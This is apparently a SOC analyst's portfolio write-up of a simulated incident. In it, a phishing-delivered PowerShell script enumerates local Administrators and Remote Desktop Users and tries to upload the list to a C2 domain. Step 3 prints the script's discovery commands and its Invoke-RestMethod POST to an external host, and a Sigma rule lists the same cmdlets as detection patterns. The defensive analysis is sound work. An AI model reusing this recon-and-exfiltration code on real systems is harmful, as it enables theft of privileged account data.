

# SOC294 - Unauthorized Group Membership Enumeration Detected 

## 🚨 Raw Alert Details
```text
EventID : 270
Event Time : 2024-06-20T10:28:42+03:00
Rule : SOC294 - Unauthorized Group Membership Enumeration Detected
Role : Incident Responder
Alert Type : C2 / Discovery
Difficulty : Medium
MITRE ATT&CK : T1566.002, T1059.001, T1204.002, T1069.001, T1005, T1071.001, T1567
Hostname : Frederick
IP Address : 172.16.17.208
Event Type : Execute a Remote Command
Trigger Reason : Unauthorized Group Membership Enumeration Detected
Alert Trigger Command : Get-LocalGroupMember -Name "Administrators"
EDR Action : Allowed
```

## Alert Overview
- **Severity:** High
- **Detection Source:** EDR / PowerShell Script Block Logging (Event ID 4104)
- **Asset Affected:** Frederick (172.16.17.208 - Windows 10)
- **Threat Type:** Spearphishing / Reconnaissance / Permission Groups Discovery / Staged Exfiltration
- **Verdict:** True Positive (Compromised)
- **Containment Status:** Contained (Isolated)

## 🧠 Attack Context / Technical Background
This incident demonstrates a classic post-exploitation reconnaissance and staging phase delivered via spearphishing. 

**The Mechanics:** The attacker sends a phishing email masquerading as a performance optimization utility called the **Performance Analysis Script (PAS)**. Once the victim downloads and executes the package, a malicious PowerShell script (`PAS.ps1`) runs locally. Instead of immediately deploying ransomware or a destructive payload, the script focuses entirely on **Discovery**: querying local security groups (specifically local Administrators and Remote Desktop Users) to map out who holds administrative and remote access privileges on the machine. Once compiled into a text file, the script attempts to exfiltrate this sensitive membership list back to an external C2 server via an HTTP POST request using `Invoke-RestMethod`.

## Investigation Steps

### 1. Initial Access Verification (Phishing Triage)
The investigation began by reviewing the email delivery gateway to identify the source of the compromise.
- **Sender:** `support@mailperformance.hopto.org` (Sent to `frederick@letsdefend.io`).
- **Subject:** `!!!Optimize Your System Performance!!!`
- **Lure:** The email promoted a fake tool called the "Performance Analysis Script (PAS)" and directed the user to download an attached/linked file.
- **Browser History:** Confirmed the user downloaded the payload via an AWS S3 bucket: `https://files-ld.s3.us-east-2.amazonaws.com/pas.zip`.

<img width="1556" height="622" alt="image" src="https://github.com/user-attachments/assets/89cfddea-21f3-4b37-b073-3d68e5ef651e" />

<img width="863" height="378" alt="image" src="https://github.com/user-attachments/assets/786935fa-c51e-4500-9ba1-7b7b835ef3a3" />


### 2. Execution Verification (Process Lineage & Extraction)
Process telemetry confirmed the user interacted with the downloaded archive.
- **Process Creation:** `7zG.exe` extracted `pas.zip` into the user's Downloads folder, dropping the script `PAS.ps1`.
- **Execution:** The script executed via `powershell.exe`, initiating the discovery phase.

<img width="579" height="146" alt="image" src="https://github.com/user-attachments/assets/2e678ba1-5360-4d37-8c2e-5f50344201e9" />


### 3. PowerShell Script Block Analysis (Event ID 4104)
The core trigger for the alert was captured in PowerShell Script Block Logging, which revealed the exact code executed by `PAS.ps1`:
- **Discovery Commands:** 
  - `Get-LocalGroupMember -Name "Administrators" | Out-File -FilePath "...\Administrators.txt"`
  - `Get-LocalGroupMember -Name "Remote Desktop Users" | Out-File -FilePath "...\RemoteDesktopUsers.txt"`
- **Staging:** `Get-Content` combined both text files into a single artifact: `CombinedMembers.txt`.
- **Exfiltration Attempt:** 
  `$uri = "http://dhl.23156.arabtesters.com/upload"`
  `Invoke-RestMethod -Uri $uri -Method Post -InFile $combinedFile -ContentType "multipart/form-data"`

<img width="610" height="592" alt="image" src="https://github.com/user-attachments/assets/3c50a8b2-0458-4127-adba-6a2a45dbfd5d" />


### 4. Network & Threat Intelligence Enrichment
The destination domain identified in the PowerShell script (`dhl.23156.arabtesters.com`) was queried against VirusTotal.
- **Finding:** VirusTotal flagged the domain as malicious/phishing. Sysmon DNS queries confirmed the host attempted to resolve the domain to `188.93.233.193`.

<img width="613" height="390" alt="image" src="https://github.com/user-attachments/assets/9485f380-97d5-421b-9d04-001ed48a4657" />


<img width="1787" height="572" alt="image" src="https://github.com/user-attachments/assets/10c8c68c-c3a3-40c4-8502-c53fce4c85d2" />

<img width="1775" height="238" alt="image" src="https://github.com/user-attachments/assets/7baf76ed-7eb0-490d-9272-739e49f89a10" />


## Analysis & Findings
The incident is a confirmed **True Positive**. The user "Frederick" fell victim to a spearphishing campaign advertising a fake performance script. The downloaded PowerShell script (`PAS.ps1`) successfully executed, performing internal reconnaissance by enumerating local Administrators and Remote Desktop Users. The script then attempted to exfiltrate this privileged account list via an HTTP POST request to an external C2 server (`dhl.23156.arabtesters.com`). While proxy logs indicated the exfiltration request ultimately failed or resulted in an error status, the host successfully ran unauthorized reconnaissance code, confirming a system compromise.

## MITRE ATT&CK Mapping
| Tactic | Technique ID | Technique Name |
| :--- | :--- | :--- |
| **Initial Access** | T1566.002 | Phishing: Spearphishing Link |
| **Execution** | T1059.001 | Command and Scripting Interpreter: PowerShell |
| **Execution** | T1204.002 | User Execution: Malicious File |
| **Discovery** | T1069.001 | Permission Groups Discovery: Local Groups (`Get-LocalGroupMember`) |
| **Collection** | T1005 | Data from Local System |
| **Exfiltration** | T1071.001 | Application Layer Protocol: Web Protocols (`Invoke-RestMethod`) |

## Indicators of Compromise (IOCs)
| Type | Value | Context |
| :--- | :--- | :--- |
| URL | `https://files-ld.s3.us-east-2.amazonaws.com/pas.zip` | Malicious Payload Delivery URL (AWS S3) |
| Domain | `dhl.23156.arabtesters.com` | Attacker C2 / Exfiltration Drop Domain |
| IP Address | 188.93.233.193 | Resolved C2 Server IP |
| Script Name | `PAS.ps1` | Performance Analysis Script (Recon Stager) |
| Email | `support@mailperformance.hopto.org` | Phishing Sender Address |

## 🛠️ Detection Engineering & Hunting Logic
To improve automated detection of local group enumeration and web exfiltration, the following Sigma rule has been engineered for deployment in the SIEM:

```yaml
title: Local Group Enumeration and HTTP Exfiltration via PowerShell
id: b12f0595-1234-4a5e-994d-70580c5e9f05
status: experimental
description: Detects enumeration of local administrators or RDP users followed by a web upload using Invoke-RestMethod.
author: SOC Analyst Portfolio
logsource:
  product: windows
  service: powershell
detection:
  selection_recon:
    EventID: 4104
    ScriptBlockText|contains:
      - 'Get-LocalGroupMember'
      - 'Administrators'
      - 'Remote Desktop Users'
  selection_exfil:
    ScriptBlockText|contains:
      - 'Invoke-RestMethod'
      - 'Invoke-WebRequest'
      - 'Multipart/form-data'
  condition: selection_recon and selection_exfil
falsepositives:
  - Legitimate administrative auditing scripts written by internal IT staff
level: high
tags:
  - attack.t1069.001
  - attack.t1071.001
```

## 🚀 Decision Tree 
1. **Analyze Initial Vector:** Did the user execute a script downloaded from an external link or email?
   - If Yes -> Proceed to PowerShell Script Block logs (Event ID 4104).
2. **Evaluate Script Intent:** Does the PowerShell script enumerate local users or groups (`Get-LocalGroupMember`)?
   - If Yes -> **Indicates internal reconnaissance (Discovery).**
3. **Check Exfiltration Vectors:** Does the script attempt to send this data externally using `Invoke-RestMethod` or `Invoke-WebRequest`?
   - If Yes -> **Verdict: True Positive - Successful Compromise (Recon & Exfil Attempt).**
4. **Action:** Isolate host immediately, purge phishing email, and block C2 domains.

## 📝 Playbook Questions & Answers
- **Should the device be isolated?**
  - *Answer:* Yes.
  - *Reasoning:* An email from a malicious sender contained a link to a suspicious script which was downloaded and executed, resulting in unauthorized reconnaissance and an attempt to exfiltrate privileged account lists.
- **Determine the Scope:**
  - *Answer:* No (Localized to one machine).
  - *Reasoning:* Searching the sender address in Email Security confirmed the email was only received by `frederick@letsdefend.io`.
- **IP Reputation Check:**
  - *Answer:* Yes.
  - *Reasoning:* The payload was downloaded from an AWS S3 URL flagged as malicious across threat intelligence platforms.
- **Attacker IP Analysis:**
  - *Answer:* External.
  - *Reasoning:* The script was delivered via an external phishing vector and communicated with an external C2 domain.
- **Determine the Type of Discovery:**
  - *Answer:* Permission Groups Discovery.
  - *Reasoning:* The command `Get-LocalGroupMember -Name "Remote Desktop Users"` specifically targets group permissions to identify users with remote access rights.
- **Determine the OS (Operating System):**
  - *Answer:* Windows (Windows 10).
  - *Reasoning:* Endpoint Security confirmed the host operating system is Windows 10.

## Response & Containment Actions Taken
- **Host Isolation:** The compromised endpoint (`Frederick / 172.16.17.208`) was immediately **Isolated** from the network via EDR to halt further data staging or secondary payload downloads.
- **Perimeter Blocking:** The C2 domain (`dhl.23156.arabtesters.com`) and associated IP were added to the perimeter blocklist.
- **Why:** Isolating the host stops the attacker from successfully exfiltrating privileged user lists or deploying additional ransomware/RAT stagers.

## Recommendations
1. **PowerShell Script Block Logging:** Ensure Event ID 4104 is actively forwarded to the SIEM across all endpoints. Script block logging is the only way to catch uncompiled PowerShell payloads executing commands in memory.
2. **Endpoint Execution Policy:** Enforce restricted PowerShell execution policies via Group Policy to prevent users from accidentally executing downloaded `.ps1` scripts.
3. **Privileged Account Audit:** Because the attacker specifically targeted the `Administrators` and `Remote Desktop Users` groups for enumeration, audit all accounts in those groups to ensure no unauthorized users were added following the incident.

## Lessons Learned
- **Analyst Reflection (Playbook Taxonomy - Discovery Sub-categories):** During the playbook completion, I initially selected "Group Policy Discovery" as the discovery technique.
- **The Lesson (Precise MITRE Mapping):** The command used was `Get-LocalGroupMember -Name "Remote Desktop Users"`. This is designed to find out *who* has permissions to log into the machine remotely, which falls under **Permission Groups Discovery (T1069.001)**, not Group Policy Discovery. Understanding the exact nuance of MITRE sub-techniques prevents misclassification during incident reporting.

## 🛠️ Skills & Tools Used
- PowerShell Script Block Analysis (Event ID 4104)
- EDR Browser History & Download Triage
- Threat Intelligence Correlation (VirusTotal)
- Incident Containment (Host Isolation)
